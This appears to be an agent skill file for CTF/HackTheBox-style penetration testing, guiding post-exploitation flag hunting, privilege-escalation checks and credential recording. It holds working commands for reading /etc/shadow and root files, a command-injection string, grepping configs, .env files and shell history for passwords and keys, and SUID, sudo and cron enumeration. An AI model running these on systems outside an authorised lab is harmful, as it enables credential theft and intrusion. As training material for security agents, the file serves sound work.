---
name: flag-capture
description: Post-exploitation flag hunting and recording. Use after achieving any access level (command injection, shell, file read) to find flags, capture credentials, and update the PTT.
---

# Flag Capture

After gaining access (RCE, shell, file read), systematically find flags and record findings.

---

## Step 1: Search for Flags

Run these searches based on your access level.

### If you have command execution (RCE, shell):

```bash
# Standard CTF/HTB flag locations
cat /home/*/user.txt 2>/dev/null
cat /root/root.txt 2>/dev/null
cat /flag.txt 2>/dev/null
cat /root/flag* 2>/dev/null

# Broader search (if standard locations empty)
find / -maxdepth 4 -name "*.txt" -size -1k 2>/dev/null | head -20
find / -maxdepth 4 -name "flag*" -o -name "proof*" -o -name "secret*" 2>/dev/null | head -20

# Windows flag locations (if Windows target)
type C:\Users\*\Desktop\user.txt 2>nul
type C:\Users\Administrator\Desktop\root.txt 2>nul
```

### If you only have file read (LFI, path traversal):

Try reading these paths directly:
- `/home/user/user.txt`, `/home/*/user.txt`
- `/root/root.txt`
- `/flag.txt`, `/flag`
- `/etc/shadow` (proves root-level read)

### If you have command injection (no interactive shell):

Use your injection point to run:
```bash
# Inline flag read via injection
id; cat /home/*/user.txt; cat /root/root.txt
```

---

## Step 2: Record Findings

After finding a flag or credential, record it using the findings tools:

### Flags

Call `submit_flag` immediately:
- `flag_type`: `user_flag` or `root_flag`
- `value`: the flag content exactly as found
- `path`: where you found it (e.g. `/home/user/user.txt`)
- `access_level`: `user` or `root`

### Credentials

Call `submit_credential` for each credential found:
- `username`: the account name
- `password`: the password, hash, or key content
- `credential_type`: `password`, `hash`, `key`, or `token`
- `service`: what service it's for (e.g. `ssh`, `mysql`, `drupal`)

### PTT Update

Also update the PTT at `/artifacts/{target}/ptt.yaml` for your own tracking:
1. Update `access_level` to reflect current access (`none` -> `user` -> `root`)
2. Mark successful techniques as `status: "success"`

The findings tools handle scored recording. The PTT tracks your attack progress.

---

## Step 3: Privilege Escalation Quick Checks

After getting user-level access, run these before searching for root flag:

```bash
# SUID binaries
find / -perm -4000 -type f 2>/dev/null | head -20

# Sudo permissions
sudo -l 2>/dev/null

# Writable cron jobs
ls -la /etc/cron* 2>/dev/null
cat /etc/crontab 2>/dev/null

# Kernel version (for kernel exploits)
uname -a

# World-writable directories
find / -maxdepth 3 -writable -type d 2>/dev/null | head -10
```

If any of these reveal an escalation vector, exploit it then read `/root/root.txt`.

---

## Step 4: Credential Harvesting

Check for credentials that support the `credential_discovery` objective:

```bash
# Config files with passwords
grep -ri "password\|passwd\|secret\|api_key" /var/www/ /opt/ /etc/ 2>/dev/null | head -20

# Database credentials
cat /var/www/*/settings.php 2>/dev/null
cat /var/www/*/.env 2>/dev/null
cat /opt/*/.env 2>/dev/null

# History files
cat /home/*/.bash_history 2>/dev/null | head -30
cat /root/.bash_history 2>/dev/null | head -30
```

Record each credential with `submit_credential`:
- `credential_type`: use `password` for plaintext, `hash` for hashes, `key` for SSH keys, `token` for API tokens
- `service`: the service the credential applies to (e.g. `ssh`, `mysql`, `web`)

---

## Common Flag Formats

- `FLAG{...}`, `flag{...}`, `HTB{...}`
- 32-character hex strings (MD5 hashes)
- Base64-encoded strings
- Plain text strings in .txt files

## Reminder

- Use `printf` or `echo -e` for multi-line output, NOT heredocs (`<<EOF`)
- Always pipe `find` through `head` to limit output
- Record ALL findings immediately using `submit_flag` and `submit_credential` tools
